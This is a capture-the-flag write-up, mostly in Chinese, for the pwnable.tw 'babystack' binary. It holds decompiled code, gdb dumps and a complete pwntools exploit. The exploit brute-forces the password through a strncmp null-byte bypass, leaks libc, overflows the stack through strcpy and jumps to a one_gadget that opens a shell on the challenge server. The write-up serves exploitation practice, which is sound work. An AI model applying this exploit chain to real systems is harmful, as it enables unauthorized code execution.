# babystack

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

```c=
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  _QWORD *v3; // rcx
  __int64 v4; // rdx
  _BYTE v6[64]; // [rsp+0h] [rbp-60h] BYREF
  _QWORD nn_random_10[2]; // [rsp+40h] [rbp-20h] BYREF
  _BYTE nn_input[16]; // [rsp+50h] [rbp-10h] BYREF

  sub_D30(a1, a2, a3);
  nn_random = open("/dev/urandom", 0);
  read(nn_random, nn_random_10, 0x10uLL);
  v3 = nn_bss;
  v4 = nn_random_10[1];
  *(_QWORD *)nn_bss = nn_random_10[0];
  v3[1] = v4;
  close(nn_random);
  while ( 1 )
  {
    write(1, ">> ", 3uLL);
    _read_chk(0LL, nn_input, 16LL, 16LL);
    if ( nn_input[0] == '2' )
      break;
    if ( nn_input[0] == '3' )
    {
      if ( nn_bss_login_flag )
        sub_E76(v6);
      else
LABEL_13:
        puts("Invalid choice");
    }
    else
    {
      if ( nn_input[0] != '1' )
        goto LABEL_13;
      if ( nn_bss_login_flag )
        nn_bss_login_flag = 0;
      else
        nn_input_passwd_and_check(nn_random_10);
    }
  }
  if ( !nn_bss_login_flag )
    exit(0);
  memcmp(nn_random_10, nn_bss, 0x10uLL);
  return 0LL;
}



int __fastcall sub_DEF(const char *a1)
{
  size_t v1; // rax
  char s[128]; // [rsp+10h] [rbp-80h] BYREF

  printf("Your passowrd :");
  sub_CA0(s, 127LL);
  v1 = strlen(s);
  if ( strncmp(s, a1, v1) )
    return puts("Failed !");
  nn_bss_login_flag = 1;
  return puts("Login Success !");
}

int __fastcall sub_E76(char *a1)
{
  char src[128]; // [rsp+10h] [rbp-80h] BYREF

  printf("Copy :");
  sub_CA0((unsigned __int8 *)src, 0x3Fu);
  strcpy(a1, src);
  return puts("It is magic copy !");
}
```

input 1，進入 login，可寫 128 bytes
input 2，離開程式
input 3，進入 copy

password 可以不輸入繞過，因為 `strncmp(s, a1, 0)` 利用 `\x00` 截斷，爆破出 random 

copy and login 函數的 stack 是一樣的， 都只有一個區域變數

copy 會從 stdin 讀 0x3f aka 128 到 main stack local var 64 bytes，但如果不讀全部 stdin，就會直接複製 copy's stack 上的資料到 main stack，又基於 copy and login 函數的 stack 是一樣的 

所以可以靠 login 寫入資料，copy 蓋掉 ret address



想辦法 leak libc 
```
gef➤  dereference $rsp -l 20
0x00007fffffffd980│+0x0000: 0x0000034000000340   ← $rsp
0x00007fffffffd988│+0x0008: 0x00007fffffffda20  →  0x0000555555400064  →   add BYTE PTR [rax], al
0x00007fffffffd990│+0x0010: 0x0000000000000000   ← $rax, $rsi
0x00007fffffffd998│+0x0018: 0x00007ffff7e0c3f5  →  <_IO_default_setbuf+0045> cmp eax, 0xffffffff
0x00007fffffffd9a0│+0x0020: 0x0000000000000000
0x00007fffffffd9a8│+0x0028: 0x00007ffff7f99780  →  0x00000000fbad2887
0x00007fffffffd9b0│+0x0030: 0x0000000000000000
0x00007fffffffd9b8│+0x0038: 0x0000000000000000
0x00007fffffffd9c0│+0x0040: 0x00007ffff7f95600  →  0x0000000000000000
0x00007fffffffd9c8│+0x0048: 0x959836b1bf7d2400
0x00007fffffffd9d0│+0x0050: 0x00007ffff7f99780  →  0x00000000fbad2887
0x00007fffffffd9d8│+0x0058: 0x00007ffff7dff6e5  →  <setvbuf+00f5> cmp rax, 0x1
```

這邊沒換 libc 先 local 測



hex(libc.sym['_IO_file_setbuf']) = 0x78430

hex(libc.sym['_IO_default_setbuf']) = ??????

hex(libc.sym['setvbuf']) = 0x815f0

0x00007ffff7d7e000+0x815f0+0xf5 = 0x7ffff7dff6e5

或這是 gdb 另外找神奇的某段 -offset 拿到 libc base
```
0x00007ffff7d7e000 0x00007ffff7da6000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7da6000 0x00007ffff7f3b000 0x0000000000028000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f3b000 0x00007ffff7f93000 0x00000000001bd000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f93000 0x00007ffff7f94000 0x0000000000215000 --- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f94000 0x00007ffff7f98000 0x0000000000215000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f98000 0x00007ffff7f9a000 0x0000000000219000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
```

首先爆破出 random

再來 leak libc

```python=
    p.sendafter('>>', '1')
    p.sendafter('Your passowrd :', b'\x00' + b'a' * (0x48 - 1))
    p.sendafter('>>', '3')
    p.sendafter('Copy :', 'a') # 為了蓋掉繞過 password 的 \x00 
    # stack 寫 0x48 大小的 a ，因為是從 rsp+0x10 開始寫 所以只要 0x58-0x10 大小，後面就是 libc 的 <setvbuf+00f5>
    # 已經寫入一堆 a 了，只要爆破後面 6 bytes ，已知最高兩位是 aslr \x00\x00
    p.sendafter('>>', '1')
    leak_addr = leak(b'a' * (0x48 - 0x40), 6)
```

```
-0000000000000060 // Use data definition commands to manipulate stack variables and arguments.
-0000000000000060 // Frame size: 60; Saved regs: 8; Purge: 0
-0000000000000060
-0000000000000060     _BYTE nn_mainstack60[64];
-0000000000000020     _QWORD nn_random_10;
-0000000000000018     _QWORD var_18;
-0000000000000010     _BYTE nn_input_menu[16];
+0000000000000000     _QWORD __saved_registers;
+0000000000000008     _UNKNOWN *__return_address;
+0000000000000010
+0000000000000010 // end of stack variables
```



```python=

from pwn import *



elf = ELF('./babystack')
libc = ELF('./libc_64.so.6')
#context.log_level = 'debug'

def leak(msg = b'', leak_size = 0):
    ans = b''
    for i in range(leak_size):
        j = 1
        while(1):
            p.sendafter('>>', '1')
            p.sendafter('Your passowrd :', msg + ans + j.to_bytes(1, 'big') + b'\x00')
            if(b'Login Success !' in p.recvuntil('!')):
                ans = ans + j.to_bytes(1, 'big')
                p.sendafter('>>', '1')
                break
            else:
                j += 1
    return ans


if __name__ == '__main__':
    p = remote("chall.pwnable.tw", 10205)
    

    random = leak(b'', 0x10)

    p.sendafter('>>', '1')
    p.sendafter('Your passowrd :', b'\x00' + b'a' * (0x48 - 1))
    p.sendafter('>>', '3')
    p.sendafter('Copy :', 'a')
    

    p.sendafter('>>', '1')
    leak_addr = leak(b'a' * (0x48 - 0x40), 6)
    libc_addr = u64(leak_addr + b'\x00\x00') - libc.sym['_IO_file_setbuf'] - 0x09
    print(hex(libc_addr))
    
    one_gadget = libc_addr + 0xf0567
    '''
    0xf0567 execve("/bin/sh", rsp+0x70, environ)
    constraints:
    [rsp+0x70] == NULL
    '''
    p.sendafter('>>', '1')
    p.sendafter('Your passowrd :', b'\x00' + b'a' * 0x3f + random + b'c' * 0x18 + p64(one_gadget))
    p.sendafter('>>', '3')
    p.sendafter('Copy :', 'a')


p.sendafter('>>', '2')
p.sendline("whoami")
p.interactive()
```




最後 ret address 放上 one gadget

跑一輪大概要 10 多分鐘


>FLAG{Its_juS7_a_st4ck0v3rfl0w}